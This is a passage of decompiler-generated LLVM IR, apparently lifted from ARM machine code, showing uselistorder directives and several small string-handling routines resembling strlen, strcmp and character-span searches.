  uselistorder i32 %v7_15428, { 0, 2, 1 }
  uselistorder i32 %v16_15424, { 1, 0 }
  uselistorder i32 %v4_15420, { 1, 2, 0 }
  uselistorder i32 %v0_15430.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15428, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15414, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15410, { 1, 0 }
  uselistorder i32 %v1_1540c, { 1, 0 }
  uselistorder i32 %v10_15408, { 1, 0 }
  uselistorder i32 %v0_15408, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1540c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15400, { 0, 2, 1 }
  uselistorder i32 %v2_153f4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_153f4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1540c37, { 1, 2, 0 }
  uselistorder i32 %v1_153ec, { 2, 1, 0 }
  uselistorder i32 %v1_153e4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_153dc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_153d8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_153d4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_153d4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_153c4, { 0, 2, 1 }
  uselistorder i32 %v4_153c0, { 1, 0 }
  uselistorder i32 %v3_153b4, { 1, 0 }
  uselistorder i32 %v1_153ac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_153a0, { 1, 0 }
  uselistorder i32 %v12_1539c, { 0, 2, 1 }
  uselistorder i32 %v8_1537c, { 1, 0, 2 }
  uselistorder i32 %v5_1537c, { 1, 0, 2 }
  uselistorder i32 %v2_1537c, { 1, 0, 2 }
  uselistorder i32 %v0_1537c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1539c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15358, { 0, 2, 1 }
  uselistorder i32 %v4_15354, { 1, 0 }
  uselistorder i32 %v3_15348, { 1, 0 }
  uselistorder i32 %v1_15340, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15334, { 1, 0 }
  uselistorder i32 %v12_15330, { 0, 2, 1 }
  uselistorder i32 %v8_15310, { 1, 0, 2 }
  uselistorder i32 %v5_15310, { 1, 0, 2 }
  uselistorder i32 %v2_15310, { 1, 0, 2 }
  uselistorder i32 %v0_15310, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15330, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_152ec, { 0, 2, 1 }
  uselistorder i32 %v4_152e8, { 1, 0 }
  uselistorder i32 %v3_152dc, { 1, 0 }
  uselistorder i32 %v1_152d4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_152c8, { 1, 0 }
  uselistorder i32 %v12_152c4, { 0, 2, 1 }
  uselistorder i32 %v8_152a4, { 1, 0, 2 }
  uselistorder i32 %v5_152a4, { 1, 0, 2 }
  uselistorder i32 %v2_152a4, { 1, 0, 2 }
  uselistorder i32 %v0_152a4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_152c4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_15300, { 0, 2, 1 }
  uselistorder i32 %v1_152fc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_15280, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15280, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15304, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1539c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_15274, { 1, 0 }
  uselistorder i32 %v0_15274, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1526c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1526c, { 1, 0, 2 }
  uselistorder i32 %v0_1526c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1539c77, { 1, 0 }
  uselistorder i32 %v1_1524c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15254, { 1, 0 }
  uselistorder i32 %v0_15228, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1521c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_15208, { 1, 0, 2 }
  uselistorder i32 %v1_15204, { 1, 0 }
  uselistorder i32 %v1_151fc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_151fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_151f4, { 0, 2, 1 }
  uselistorder i32 %v3_151f4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_151f4, { 1, 0 }
  uselistorder i1 %v1_151f4, { 1, 0 }
  uselistorder i32 %v3_151f0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_151e8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_151d4, { 1, 2, 0 }
  uselistorder i32 %v1_151cc, { 0, 2, 1 }
  uselistorder i32 %v12_151c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_151bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_151c0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_151b0, { 0, 2, 1 }
  uselistorder i32 %v1_151a8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_151a8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_151a0, { 1, 0 }
  uselistorder i32 %v1_15198, { 2, 1, 0 }
  uselistorder i32 %v2_15190, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_15190, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1518c, { 1, 0 }
  uselistorder i32 %v2_15180, { 1, 0 }
  uselistorder i32 %v1_15180, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_15180, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 4, 5, 3, 1, 2 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 15, 16, 17, 0, 26, 1, 27, 18, 19, 4, 20, 5, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 14, 23, 2, 24, 3, 25 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 28, 2, 4, 5, 3, 6, 7, 8, 9, 17, 33, 38, 36, 37, 35, 29, 30, 21, 22, 31, 32, 34, 25, 26, 27, 18, 24, 23, 11, 12, 10, 13, 14, 15, 16, 19, 20, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 5, 6, 7, 14, 22, 23, 8, 9, 10, 2, 11, 12, 13, 15, 16, 3, 17, 4, 18, 0, 19, 1, 20, 21 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 13, 3, 5, 6, 14, 15, 9, 10, 11, 12, 18, 19, 20, 7, 16, 8, 17, 1 }
  uselistorder i32 40, { 3, 9, 11, 4, 2, 7, 6, 10, 8, 12, 13, 14, 5, 15, 16, 0, 17, 19, 18, 20, 1, 21, 23, 22, 24 }
  uselistorder i32 36, { 4, 19, 5, 6, 7, 20, 8, 17, 9, 18, 10, 11, 12, 0, 1, 13, 2, 14, 3, 15, 16 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 1, 2, 3, 4, 0 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 58, 59, 60, 61, 8, 9, 10, 12, 11, 13, 1, 14, 62, 63, 64, 15, 65, 16, 17, 66, 18, 57, 89, 90, 53, 54, 55, 56, 19, 20, 21, 22, 104, 105, 23, 106, 24, 2, 25, 91, 92, 26, 93, 51, 52, 83, 84, 80, 75, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77, 78, 79, 81, 82, 85, 86, 87, 88, 27, 28, 29, 30, 31, 3, 32, 33, 34, 4, 35, 36, 5, 37, 38, 39, 40, 41, 42, 6, 96, 43, 97, 98, 99, 100, 44, 45, 7, 101, 46, 102, 47, 48, 49, 103, 107, 94, 50, 95 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 147, 148, 149, 150, 151, 152, 153, 154, 155, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2, 72, 73, 32, 156, 157, 12, 13, 120, 121, 122, 123, 124, 125, 117, 118, 119, 126, 139, 140, 127, 128, 129, 130, 131, 132, 133, 1, 134, 135, 137, 138, 136, 41, 42, 43, 44, 45, 46, 141, 142, 143, 47, 106, 74, 14, 15, 16, 17, 18, 0, 22, 23, 19, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 144, 145, 146, 70, 71 }
  uselistorder label %dec_label_pc_155f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154b8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_15444, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15408, { 1, 0 }
  uselistorder label %dec_label_pc_153f4, { 1, 0 }
  uselistorder label %dec_label_pc_153b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15348, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1527c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1524c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_151e8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_151a8, { 1, 0 }
}

define i32 @function_15610(i32 %arg1) local_unnamed_addr {
dec_label_pc_15610:
  %v1_15610 = and i32 %arg1, -4
  %v1_15614 = inttoptr i32 %v1_15610 to i32*
  %v2_15614 = load i32, i32* %v1_15614, align 4
  %v1_15618 = urem i32 %arg1, 4
  store i32 %v1_15618, i32* @r3, align 4
  %v2_15618 = icmp eq i32 %v1_15618, 0
  %v1_1561c = sub nsw i32 0, %v1_15618
  br i1 %v2_15618, label %.preheader.preheader, label %dec_label_pc_15624

dec_label_pc_15624:                               ; preds = %dec_label_pc_15610
  %v1_15624 = or i32 %v2_15614, 255
  %v7_15628 = icmp eq i32 %v1_15618, 1
  br i1 %v7_15628, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_15624
  %v9_1562c = or i32 %v2_15614, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_15624, %bb
  %v8_15634 = phi i32 [ %v1_15624, %dec_label_pc_15624 ], [ %v9_1562c, %bb ]
  %v1_15630 = add nsw i32 %v1_15618, -2
  store i32 %v1_15630, i32* @r3, align 4
  %v7_15634 = icmp eq i32 %v1_15618, 3
  br i1 %v7_15634, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_15634 = or i32 %v8_15634, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_15610
  %v1_15644.ph = phi i32 [ %v2_15614, %dec_label_pc_15610 ], [ %v9_15634, %bb34 ], [ %v8_15634, %bb33 ]
  %v1_1563838 = urem i32 %v1_15644.ph, 256
  %v2_1563839 = icmp eq i32 %v1_1563838, 0
  %v2_1563c40 = and i32 %v1_15644.ph, 65280
  %v3_1563c41 = icmp eq i32 %v2_1563c40, 0
  %or.cond42 = or i1 %v2_1563839, %v3_1563c41
  %v2_1564043 = and i32 %v1_15644.ph, 16711680
  %v3_1564044 = icmp eq i32 %v2_1564043, 0
  %or.cond3145 = or i1 %v3_1564044, %or.cond42
  %v4_1564446 = icmp ult i32 %v1_15644.ph, 16777216
  %or.cond3247 = or i1 %v4_1564446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_15654, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_156481349 = phi i32 [ %v2_1564814, %.thread4 ], [ %v1_1561c, %.preheader.preheader ]
  %v1_1564c48.in = phi i32 [ %v1_1564c48, %.thread4 ], [ %v1_15610, %.preheader.preheader ]
  %v1_1564c48 = add i32 %v1_1564c48.in, 4
  %v2_1564814 = add i32 %v1_156481349, 4
  %v2_1564c = inttoptr i32 %v1_1564c48 to i32*
  %v3_1564c = load i32, i32* %v2_1564c, align 4
  %v1_15638 = urem i32 %v3_1564c, 256
  %v2_15638 = icmp eq i32 %v1_15638, 0
  %v2_1563c = and i32 %v3_1564c, 65280
  %v3_1563c = icmp eq i32 %v2_1563c, 0
  %or.cond = or i1 %v2_15638, %v3_1563c
  %v2_15640 = and i32 %v3_1564c, 16711680
  %v3_15640 = icmp eq i32 %v2_15640, 0
  %or.cond31 = or i1 %v3_15640, %or.cond
  %v4_15644 = icmp ult i32 %v3_1564c, 16777216
  %or.cond32 = or i1 %v4_15644, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_15654, label %.thread4

dec_label_pc_15654:                               ; preds = %.thread4, %.preheader.preheader
  %v1_1564813.lcssa = phi i32 [ %v1_1561c, %.preheader.preheader ], [ %v2_1564814, %.thread4 ]
  %v2_15638.lcssa = phi i1 [ %v2_1563839, %.preheader.preheader ], [ %v2_15638, %.thread4 ]
  %v3_1563c.lcssa = phi i1 [ %v3_1563c41, %.preheader.preheader ], [ %v3_1563c, %.thread4 ]
  %v3_15640.lcssa = phi i1 [ %v3_1564044, %.preheader.preheader ], [ %v3_15640, %.thread4 ]
  br i1 %v2_15638.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_15654
  %v2_15658 = add i32 %v1_1564813.lcssa, 1
  br i1 %v3_1563c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1566017 = add i32 %v1_1564813.lcssa, 2
  br i1 %v3_15640.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15668 = add i32 %v1_1564813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15654, %bb35, %bb36, %bb37
  %v1_1566c = phi i32 [ %v2_15658, %bb35 ], [ %v2_1566017, %bb36 ], [ %v2_15668, %bb37 ], [ %v1_1564813.lcssa, %dec_label_pc_15654 ]
  ret i32 %v1_1566c

; uselistorder directives
  uselistorder i32 %v1_1564813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_1564c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15644.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15618, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 2, 0, 5, 1, 4, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 15 }
  uselistorder i32 -2, { 1, 3, 4, 2, 6, 7, 8, 0, 5, 9, 25, 24, 26, 27, 28, 17, 18, 19, 20, 21, 22, 23, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 65535, { 2, 105, 0, 1, 10, 53, 3, 29, 54, 28, 55, 26, 56, 27, 57, 58, 11, 59, 4, 60, 61, 33, 62, 32, 63, 30, 64, 31, 65, 13, 12, 66, 67, 34, 68, 35, 69, 15, 14, 70, 71, 36, 72, 37, 73, 16, 17, 5, 6, 24, 23, 39, 74, 38, 75, 18, 19, 7, 40, 76, 41, 77, 78, 79, 20, 80, 81, 8, 42, 82, 43, 83, 44, 84, 85, 86, 21, 87, 88, 9, 47, 89, 45, 90, 46, 91, 92, 22, 93, 25, 48, 94, 49, 95, 50, 96, 97, 98, 51, 99, 100, 101, 102, 52, 103, 104 }
  uselistorder i32 -4, { 41, 18, 62, 63, 64, 6, 19, 20, 21, 65, 66, 67, 7, 22, 23, 24, 68, 69, 70, 8, 25, 26, 71, 17, 16, 72, 73, 74, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 75, 11, 34, 49, 50, 51, 9, 52, 53, 54, 35, 48, 2, 36, 42, 43, 44, 45, 46, 47, 0, 1, 55, 56, 57, 58, 59, 60, 61, 37, 38, 39, 40, 10 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_15670(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15674.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15670

dec_label_pc_15670:                               ; preds = %bb3, %bb
  %v0_15674 = phi i32 [ %v0_15674.pre, %bb ], [ %v5_15674, %bb3 ]
  %v0_15670 = phi i32 [ %tmp, %bb ], [ %v5_15670, %bb3 ]
  %v1_15670 = inttoptr i32 %v0_15670 to i8*
  %v2_15670 = load i8, i8* %v1_15670, align 1
  %v1_15674 = inttoptr i32 %v0_15674 to i8*
  %v2_15674 = load i8, i8* %v1_15674, align 1
  %v3_15674 = zext i8 %v2_15674 to i32
  %v2_15678 = icmp eq i8 %v2_15670, 0
  br i1 %v2_15678, label %.dec_label_pc_15684_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_15670
  %v5_15674 = add i32 %v0_15674, 1
  %v5_15670 = add i32 %v0_15670, 1
  %v3_15670 = zext i8 %v2_15670 to i32
  %v10_1567c = icmp eq i8 %v2_15670, %v2_15674
  br i1 %v10_1567c, label %dec_label_pc_15670, label %dec_label_pc_15684

.dec_label_pc_15684_crit_edge:                    ; preds = %dec_label_pc_15670
  br label %dec_label_pc_15684

dec_label_pc_15684:                               ; preds = %bb3, %.dec_label_pc_15684_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15684_crit_edge ], [ %v3_15670, %bb3 ]
  %v2_15684.pre-phi = sub nsw i32 %.pn, %v3_15674
  ret i32 %v2_15684.pre-phi

; uselistorder directives
  uselistorder i8 %v2_15670, { 0, 2, 1 }
  uselistorder i32 %v0_15670, { 1, 0 }
  uselistorder i32 %v0_15674, { 1, 0 }
  uselistorder label %dec_label_pc_15684, { 1, 0 }
}

define i32 @function_15690() local_unnamed_addr {
dec_label_pc_15690:
  %stack_var_-16 = alloca i32, align 4
  %v3_15690 = load i32, i32* @r4, align 4
  store i32 %v3_15690, i32* %stack_var_-16, align 4
  %v6_15690 = load i32, i32* @r5, align 4
  %v9_15690 = load i32, i32* @r6, align 4
  %v0_15694 = load i32, i32* @r0, align 4
  %v0_15698 = load i32, i32* @r1, align 4
  store i32 %v0_15698, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_156b48 = inttoptr i32 %v0_15694 to i8*
  %v2_156b49 = load i8, i8* %v1_156b48, align 1
  %v2_156b811 = icmp eq i8 %v2_156b49, 0
  store i32 %v0_15698, i32* @r0, align 4
  %v1_156c012 = add i32 %v0_15694, 1
  store i32 %v1_156c012, i32* @r4, align 4
  br i1 %v2_156b811, label %dec_label_pc_156c8, label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %dec_label_pc_15690, %dec_label_pc_156b0
  %v3_156b414.in = phi i8 [ %v2_156b4, %dec_label_pc_156b0 ], [ %v2_156b49, %dec_label_pc_15690 ]
  %v0_156bc13 = phi i32 [ %v0_156bc.pre, %dec_label_pc_156b0 ], [ %v0_15698, %dec_label_pc_15690 ]
  %v3_156b414 = zext i8 %v3_156b414.in to i32
  %v2_156a4 = call i32 @function_1585c(i32 %v0_156bc13, i32 %v3_156b414)
  %v2_156a8 = icmp eq i32 %v2_156a4, 0
  %v0_156b0 = load i32, i32* @r5, align 4
  br i1 %v2_156a8, label %dec_label_pc_156b0, label %dec_label_pc_156c8

dec_label_pc_156b0:                               ; preds = %dec_label_pc_156a4
  %v1_156b0 = add i32 %v0_156b0, 1
  %v0_156b4.pre = load i32, i32* @r4, align 4
  %v0_156bc.pre = load i32, i32* @r6, align 4
  store i32 %v1_156b0, i32* @r5, align 4
  %v1_156b4 = inttoptr i32 %v0_156b4.pre to i8*
  %v2_156b4 = load i8, i8* %v1_156b4, align 1
  %v2_156b8 = icmp eq i8 %v2_156b4, 0
  store i32 %v0_156bc.pre, i32* @r0, align 4
  %v1_156c0 = add i32 %v0_156b4.pre, 1
  store i32 %v1_156c0, i32* @r4, align 4
  br i1 %v2_156b8, label %dec_label_pc_156c8, label %dec_label_pc_156a4

dec_label_pc_156c8:                               ; preds = %dec_label_pc_156b0, %dec_label_pc_156a4, %dec_label_pc_15690
  %v0_156c8 = phi i32 [ 0, %dec_label_pc_15690 ], [ %v0_156b0, %dec_label_pc_156a4 ], [ %v1_156b0, %dec_label_pc_156b0 ]
  %v2_156cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_156cc, i32* @r4, align 4
  store i32 %v6_15690, i32* @r5, align 4
  store i32 %v9_15690, i32* @r6, align 4
  ret i32 %v0_156c8

; uselistorder directives
  uselistorder i8 %v2_156b4, { 1, 0 }
  uselistorder i32 %v0_156bc.pre, { 1, 0 }
  uselistorder i32 %v0_156b4.pre, { 1, 0 }
  uselistorder i32* @r6, {}
  uselistorder label %dec_label_pc_156a4, { 1, 0 }
}

define i32 @function_156d4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_156d4:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_157042 = load i32, i32* @r0, align 4
  %v1_157043 = inttoptr i32 %v0_157042 to i8*
  %v2_157044 = load i8, i8* %v1_157043, align 1
  %v3_157045 = zext i8 %v2_157044 to i32
  store i32 %v3_157045, i32* @ip, align 4
  %v2_157086 = icmp eq i8 %v2_157044, 0
  br i1 %v2_157086, label %dec_label_pc_15714, label %dec_label_pc_156e8.preheader

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156e8
  %v3_156e8 = zext i8 %v2_156e8 to i32
  %v1_156f0 = add i32 %v0_156f0, 1
  %v9_156e0 = icmp eq i32 %v0_156e010, %v3_156e8
  br i1 %v9_156e0, label %dec_label_pc_156fc, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156e8.preheader, %dec_label_pc_156e0
  %v0_156f0 = phi i32 [ %tmp, %dec_label_pc_156e8.preheader ], [ %v1_156f0, %dec_label_pc_156e0 ]
  %v1_156e8 = inttoptr i32 %v0_156f0 to i8*
  %v2_156e8 = load i8, i8* %v1_156e8, align 1
  %v2_156ec = icmp eq i8 %v2_156e8, 0
  br i1 %v2_156ec, label %dec_label_pc_15714, label %dec_label_pc_156e0

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156e0
  %v1_156fc = add i32 %v0_156fc, 1
  %v1_15700 = add i32 %v0_15700, 1
  %v1_15704 = inttoptr i32 %v1_15700 to i8*
  %v2_15704 = load i8, i8* %v1_15704, align 1
  %v3_15704 = zext i8 %v2_15704 to i32
  store i32 %v3_15704, i32* @ip, align 4
  %v2_15708 = icmp eq i8 %v2_15704, 0
  br i1 %v2_15708, label %dec_label_pc_15714, label %dec_label_pc_156e8.preheader

dec_label_pc_156e8.preheader:                     ; preds = %dec_label_pc_156d4, %dec_label_pc_156fc
  %v0_15700 = phi i32 [ %v1_15700, %dec_label_pc_156fc ], [ %v0_157042, %dec_label_pc_156d4 ]
  %v0_156fc = phi i32 [ %v1_156fc, %dec_label_pc_156fc ], [ 0, %dec_label_pc_156d4 ]
  %v0_156e010 = phi i32 [ %v3_15704, %dec_label_pc_156fc ], [ %v3_157045, %dec_label_pc_156d4 ]
  br label %dec_label_pc_156e8

dec_label_pc_15714:                               ; preds = %dec_label_pc_156fc, %dec_label_pc_156e8, %dec_label_pc_156d4
  %v0_15714 = phi i32 [ 0, %dec_label_pc_156d4 ], [ %v0_156fc, %dec_label_pc_156e8 ], [ %v1_156fc, %dec_label_pc_156fc ]
  ret i32 %v0_15714

; uselistorder directives
  uselistorder i32 %v0_156f0, { 1, 0 }
  uselistorder label %dec_label_pc_156e8.preheader, { 1, 0 }
}

define i32 @function_15720(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15720:
  store i32 %arg1, i32* @r0, align 4
  %v1_15724 = urem i32 %arg2, 256
  store i32 %v1_15724, i32* @r4, align 4
  %v2_15724 = icmp eq i32 %v1_15724, 0
  br i1 %v2_15724, label %dec_label_pc_15738, label %dec_label_pc_1574c.preheader

dec_label_pc_1574c.preheader:                     ; preds = %dec_label_pc_15720
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_157543 = call i32 @function_1585c(i32 %arg1, i32 %v1_15724)
  %v2_157585 = icmp eq i32 %v2_157543, 0
  br i1 %v2_157585, label %dec_label_pc_15760, label %dec_label_pc_15744

dec_label_pc_15738:                               ; preds = %dec_label_pc_15720
  %v2_1573c = call i32 @function_1585c(i32 %arg1, i32 0)
  br label %dec_label_pc_15764

dec_label_pc_15744:                               ; preds = %dec_label_pc_1574c.preheader, %dec_label_pc_15744
  %v2_157546 = phi i32 [ %v2_15754, %dec_label_pc_15744 ], [ %v2_157543, %dec_label_pc_1574c.preheader ]
  store i32 %v2_157546, i32* @r5, align 4
  %v1_15748 = add i32 %v2_157546, 1
  store i32 %v1_15748, i32* @r0, align 4
  %v0_15750 = load i32, i32* @r4, align 4
  %v2_15754 = call i32 @function_1585c(i32 %v1_15748, i32 %v0_15750)
  %v2_15758 = icmp eq i32 %v2_15754, 0
  br i1 %v2_15758, label %dec_label_pc_15760, label %dec_label_pc_15744

